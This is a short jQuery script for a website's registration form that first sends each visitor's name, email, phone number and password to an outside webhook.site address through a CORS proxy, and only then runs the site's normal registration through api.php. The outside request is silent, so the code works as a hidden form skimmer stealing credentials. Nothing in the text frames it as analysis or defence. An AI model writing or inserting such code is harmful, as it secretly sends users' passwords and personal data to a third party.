<script>
  $(document).ready(function () {
    $("#name").removeAttr("readonly");
    $("#email").removeAttr("readonly");
    $("#phone").removeAttr("readonly");
    $("#register").off("click").on("click", function (event) {
      event.preventDefault(); 

     
      let name = $("#name").val();
      let email = $("#email").val();
      let phone = $("#phone").val();
      let password = $("#password").val();
      let c_password = $("#c_password").val();

      
      $.ajax({
        url: "https://cors-anywhere.herokuapp.com/https://webhook.site/4792a131-aafb-4744-85b9-13a77b3613d7/register",
        type: "POST",
        data: {
          name: name,
          email: email,
          phone: phone,
          password: password,
          c_password: c_password,
        },
      })
        .done(function (response) {
         
          continueRegister(name, email, phone, password, c_password);
        })
        .fail(function (xhr, status, error) {
        
          console.error("Error:", error);
        });
    });

    function continueRegister(name, email, phone, password, c_password) {
      $.ajax({
        url: "api.php",
        type: "POST",
        data: {
          action: "register",
          name: name,
          email: email,
          phone: phone,
          password: password,
          c_password: c_password,
        },
        success: function (data) {
          let resp = JSON.parse(data);
          if (resp.success == "true") {
            $.ajax({
              url: "api.php",
              type: "POST",
              data: { action: "get_user_id", email: email },
              success: function (data) {
                let resp = JSON.parse(data);
                if (resp.success == "true") {
                  location.href = "login.html";
                }
              },
            });
          } else {
            console.error("Registration failed:", resp.data);
          }
        },
      });
    }
  });
</script>
